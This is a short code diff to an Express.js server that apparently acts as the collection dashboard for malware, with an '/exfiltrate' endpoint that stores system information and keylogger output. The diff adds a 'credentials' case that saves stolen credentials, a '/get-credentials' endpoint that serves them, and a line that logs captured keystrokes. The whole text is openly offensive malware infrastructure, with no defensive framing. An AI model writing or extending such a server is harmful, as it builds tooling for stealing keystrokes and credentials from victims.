@@ -15,6 +15,7 @@ app.use(express.json());
 var links = new Array();
 var system_info;
 var keylogger_info;
+var credentials = {};
 
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "dashboard.html")); // Serve the HTML file
@@ -50,6 +51,10 @@ app.post('/exfiltrate', (req, res) => {
             keylogger_info = data;
             break;
 
+       case 'credentials':
+            credentials = data;
+            break;
+
 
 //        default:
 //            console.log(`Unknown type: ${type}`);
@@ -79,7 +84,12 @@ app.get('/get-os', (req, res) => {
 });
 
 app.get('/get-keys', (req, res) => {
+    console.log(keylogger_info)
     res.json(keylogger_info);
+});
+
+app.get('/get-credentials', (req, res) => {
+    res.json(credentials);
 });
 
 app.listen(PORT, () => {
